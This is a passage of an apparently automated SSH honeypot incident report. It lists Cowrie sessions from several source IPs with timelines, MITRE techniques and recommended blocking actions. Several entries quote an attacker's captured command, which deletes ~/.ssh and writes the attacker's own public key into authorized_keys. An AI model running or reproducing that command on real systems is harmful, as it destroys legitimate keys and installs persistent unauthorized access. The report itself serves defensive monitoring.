- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a535f434383

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-05-03 19:45 |
| **Last Seen** | 2026-05-03 19:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:45:11` | `cowrie.session.connect` |
| `2026-05-03 19:45:11` | `cowrie.client.version` |
| `2026-05-03 19:45:11` | `cowrie.client.kex` |
| `2026-05-03 19:45:11` | `cowrie.login.success` |
| `2026-05-03 19:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f26f716eb2fa

| Field | Detail |
|---|---|
| **Source IP** | `79.55.224[.]44` |
| **First Seen** | 2026-05-03 19:45 |
| **Last Seen** | 2026-05-03 19:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:45:13` | `cowrie.session.connect` |
| `2026-05-03 19:45:13` | `cowrie.client.version` |
| `2026-05-03 19:45:13` | `cowrie.client.kex` |
| `2026-05-03 19:45:14` | `cowrie.login.success` |
| `2026-05-03 19:45:14` | `cowrie.session.params` |
| `2026-05-03 19:45:14` | `cowrie.command.input` |
| `2026-05-03 19:45:14` | `cowrie.command.failed` |
| `2026-05-03 19:45:14` | `cowrie.log.closed` |
| `2026-05-03 19:45:15` | `cowrie.session.params` |
| `2026-05-03 19:45:15` | `cowrie.command.input` |
| `2026-05-03 19:45:15` | `cowrie.session.file_download` |
| `2026-05-03 19:45:15` | `cowrie.log.closed` |
| `2026-05-03 19:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.55.224[.]44` to AbuseIPDB if not already reported
- [ ] Block `79.55.224[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b11147b2a9e

| Field | Detail |
|---|---|
| **Source IP** | `79.55.224[.]44` |
| **First Seen** | 2026-05-03 19:45 |
| **Last Seen** | 2026-05-03 19:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:45:17` | `cowrie.session.connect` |
| `2026-05-03 19:45:17` | `cowrie.client.version` |
| `2026-05-03 19:45:17` | `cowrie.client.kex` |
| `2026-05-03 19:45:18` | `cowrie.login.success` |
| `2026-05-03 19:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.55.224[.]44` to AbuseIPDB if not already reported
- [ ] Block `79.55.224[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a605a30508

| Field | Detail |
|---|---|
| **Source IP** | `79.55.224[.]44` |
| **First Seen** | 2026-05-03 19:50 |
| **Last Seen** | 2026-05-03 19:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:50:14` | `cowrie.session.connect` |
| `2026-05-03 19:50:14` | `cowrie.client.version` |
| `2026-05-03 19:50:14` | `cowrie.client.kex` |
| `2026-05-03 19:50:15` | `cowrie.login.success` |
| `2026-05-03 19:50:15` | `cowrie.session.params` |
| `2026-05-03 19:50:15` | `cowrie.command.input` |
| `2026-05-03 19:50:15` | `cowrie.command.failed` |
| `2026-05-03 19:50:15` | `cowrie.log.closed` |
| `2026-05-03 19:50:16` | `cowrie.session.params` |
| `2026-05-03 19:50:16` | `cowrie.command.input` |
| `2026-05-03 19:50:16` | `cowrie.session.file_download` |
| `2026-05-03 19:50:16` | `cowrie.log.closed` |
| `2026-05-03 19:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.55.224[.]44` to AbuseIPDB if not already reported
- [ ] Block `79.55.224[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa4932a16e83

| Field | Detail |
|---|---|
| **Source IP** | `79.55.224[.]44` |
| **First Seen** | 2026-05-03 19:50 |
| **Last Seen** | 2026-05-03 19:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:50:18` | `cowrie.session.connect` |
| `2026-05-03 19:50:18` | `cowrie.client.version` |
| `2026-05-03 19:50:18` | `cowrie.client.kex` |
| `2026-05-03 19:50:19` | `cowrie.login.success` |
| `2026-05-03 19:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.55.224[.]44` to AbuseIPDB if not already reported
- [ ] Block `79.55.224[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7f1f753458d

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 19:51 |
| **Last Seen** | 2026-05-03 19:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:51:26` | `cowrie.session.connect` |
| `2026-05-03 19:51:26` | `cowrie.client.version` |
| `2026-05-03 19:51:26` | `cowrie.client.kex` |
| `2026-05-03 19:51:27` | `cowrie.login.success` |
| `2026-05-03 19:51:27` | `cowrie.session.params` |
| `2026-05-03 19:51:27` | `cowrie.command.input` |
| `2026-05-03 19:51:27` | `cowrie.command.failed` |
| `2026-05-03 19:51:27` | `cowrie.log.closed` |
| `2026-05-03 19:51:27` | `cowrie.session.params` |
| `2026-05-03 19:51:27` | `cowrie.command.input` |
| `2026-05-03 19:51:27` | `cowrie.session.file_download` |
| `2026-05-03 19:51:27` | `cowrie.log.closed` |
| `2026-05-03 19:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5db0cc1f4b3a

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 19:51 |
| **Last Seen** | 2026-05-03 19:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:51:29` | `cowrie.session.connect` |
| `2026-05-03 19:51:29` | `cowrie.client.version` |
| `2026-05-03 19:51:29` | `cowrie.client.kex` |
| `2026-05-03 19:51:29` | `cowrie.login.success` |
| `2026-05-03 19:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3abcd51ae8a

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 19:52 |
| **Last Seen** | 2026-05-03 19:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:52:29` | `cowrie.session.connect` |
| `2026-05-03 19:52:29` | `cowrie.client.version` |
| `2026-05-03 19:52:29` | `cowrie.client.kex` |
| `2026-05-03 19:52:29` | `cowrie.login.success` |
| `2026-05-03 19:52:29` | `cowrie.session.params` |
| `2026-05-03 19:52:29` | `cowrie.command.input` |
| `2026-05-03 19:52:29` | `cowrie.command.failed` |
| `2026-05-03 19:52:29` | `cowrie.log.closed` |
| `2026-05-03 19:52:30` | `cowrie.session.params` |
| `2026-05-03 19:52:30` | `cowrie.command.input` |
| `2026-05-03 19:52:30` | `cowrie.session.file_download` |
| `2026-05-03 19:52:30` | `cowrie.log.closed` |
| `2026-05-03 19:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87c975588a48

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 19:52 |
| **Last Seen** | 2026-05-03 19:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:52:31` | `cowrie.session.connect` |
| `2026-05-03 19:52:31` | `cowrie.client.version` |
| `2026-05-03 19:52:31` | `cowrie.client.kex` |
| `2026-05-03 19:52:31` | `cowrie.login.success` |
| `2026-05-03 19:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7d9e5ac7e96

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 19:53 |
| **Last Seen** | 2026-05-03 19:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:53:26` | `cowrie.session.connect` |
| `2026-05-03 19:53:26` | `cowrie.client.version` |
| `2026-05-03 19:53:26` | `cowrie.client.kex` |
| `2026-05-03 19:53:26` | `cowrie.login.success` |
| `2026-05-03 19:53:27` | `cowrie.session.params` |
| `2026-05-03 19:53:27` | `cowrie.command.input` |
| `2026-05-03 19:53:27` | `cowrie.command.failed` |
| `2026-05-03 19:53:27` | `cowrie.log.closed` |
| `2026-05-03 19:53:27` | `cowrie.session.params` |
| `2026-05-03 19:53:27` | `cowrie.command.input` |
| `2026-05-03 19:53:27` | `cowrie.session.file_download` |
| `2026-05-03 19:53:27` | `cowrie.log.closed` |
| `2026-05-03 19:53:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-095c508799c7

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 19:53 |
| **Last Seen** | 2026-05-03 19:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:53:29` | `cowrie.session.connect` |
| `2026-05-03 19:53:29` | `cowrie.client.version` |
| `2026-05-03 19:53:29` | `cowrie.client.kex` |
| `2026-05-03 19:53:29` | `cowrie.login.success` |
| `2026-05-03 19:53:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c192f4a99f9

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 19:54 |
| **Last Seen** | 2026-05-03 19:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:54:22` | `cowrie.session.connect` |
| `2026-05-03 19:54:22` | `cowrie.client.version` |
| `2026-05-03 19:54:22` | `cowrie.client.kex` |
| `2026-05-03 19:54:23` | `cowrie.login.success` |
| `2026-05-03 19:54:23` | `cowrie.session.params` |
| `2026-05-03 19:54:23` | `cowrie.command.input` |
| `2026-05-03 19:54:23` | `cowrie.command.failed` |
| `2026-05-03 19:54:23` | `cowrie.log.closed` |
| `2026-05-03 19:54:23` | `cowrie.session.params` |
| `2026-05-03 19:54:23` | `cowrie.command.input` |
| `2026-05-03 19:54:23` | `cowrie.session.file_download` |
| `2026-05-03 19:54:23` | `cowrie.log.closed` |
| `2026-05-03 19:54:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d04f38c4e5d

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 19:54 |
| **Last Seen** | 2026-05-03 19:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:54:25` | `cowrie.session.connect` |
| `2026-05-03 19:54:25` | `cowrie.client.version` |
| `2026-05-03 19:54:25` | `cowrie.client.kex` |
| `2026-05-03 19:54:25` | `cowrie.login.success` |
| `2026-05-03 19:54:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a44d395fd0f

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 19:55 |
| **Last Seen** | 2026-05-03 19:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:55:18` | `cowrie.session.connect` |
| `2026-05-03 19:55:18` | `cowrie.client.version` |
| `2026-05-03 19:55:18` | `cowrie.client.kex` |
| `2026-05-03 19:55:18` | `cowrie.login.success` |
| `2026-05-03 19:55:19` | `cowrie.session.params` |
| `2026-05-03 19:55:19` | `cowrie.command.input` |
| `2026-05-03 19:55:19` | `cowrie.command.failed` |
| `2026-05-03 19:55:19` | `cowrie.log.closed` |
| `2026-05-03 19:55:19` | `cowrie.session.params` |
| `2026-05-03 19:55:19` | `cowrie.command.input` |
| `2026-05-03 19:55:19` | `cowrie.session.file_download` |
| `2026-05-03 19:55:19` | `cowrie.log.closed` |
| `2026-05-03 19:55:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dbf1164b274

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 19:55 |
| **Last Seen** | 2026-05-03 19:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:55:20` | `cowrie.session.connect` |
| `2026-05-03 19:55:20` | `cowrie.client.version` |
| `2026-05-03 19:55:21` | `cowrie.client.kex` |
| `2026-05-03 19:55:21` | `cowrie.login.success` |
| `2026-05-03 19:55:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4086dbfd5dda

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 19:56 |
| **Last Seen** | 2026-05-03 19:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:56:14` | `cowrie.session.connect` |
| `2026-05-03 19:56:14` | `cowrie.client.version` |
| `2026-05-03 19:56:14` | `cowrie.client.kex` |
| `2026-05-03 19:56:14` | `cowrie.login.success` |
| `2026-05-03 19:56:14` | `cowrie.session.params` |
| `2026-05-03 19:56:14` | `cowrie.command.input` |
| `2026-05-03 19:56:14` | `cowrie.command.failed` |
| `2026-05-03 19:56:14` | `cowrie.log.closed` |
| `2026-05-03 19:56:14` | `cowrie.session.params` |
| `2026-05-03 19:56:14` | `cowrie.command.input` |
| `2026-05-03 19:56:14` | `cowrie.session.file_download` |
| `2026-05-03 19:56:14` | `cowrie.log.closed` |
| `2026-05-03 19:56:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5abfd664d5ca

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 19:56 |
| **Last Seen** | 2026-05-03 19:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:56:16` | `cowrie.session.connect` |
| `2026-05-03 19:56:16` | `cowrie.client.version` |
| `2026-05-03 19:56:16` | `cowrie.client.kex` |
| `2026-05-03 19:56:16` | `cowrie.login.success` |
| `2026-05-03 19:56:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-965df123dc4d

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 19:58 |
| **Last Seen** | 2026-05-03 19:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
